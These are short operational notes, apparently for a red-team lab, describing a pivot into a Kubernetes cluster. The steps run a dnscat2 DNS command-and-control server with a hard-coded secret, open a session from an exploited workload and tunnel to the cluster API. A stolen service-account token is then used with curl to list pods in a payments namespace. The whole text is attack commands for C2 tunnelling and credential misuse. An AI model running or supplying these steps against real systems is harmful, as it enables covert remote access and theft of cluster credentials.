
#Attack visa using port-foward
#Attach visa just using asset-cache as jump-host


## Execute binary filess - dnscat

#once the session is stablished you can create tunnels
Run the server
podman run -p 192.168.150.2:53:53/udp --name dnscat -it --rm -v ./token:/token dnscat2 ruby ./dnscat2.rb --secret=ece3df5051e3eaf5acaf6f7165ca28c6 ralvares.local

#Exploit the workload and open a session

session -i 1
listen 127.0.0.1:8443 kubernetes.default.svc:443

#To get access to the API
podman exec -ti dnscat /bin/bash -c 'curl -k --header "Authorization: Bearer $(cat /token)" https://localhost:8443/api/v1/namespaces/payments-v2/pods'

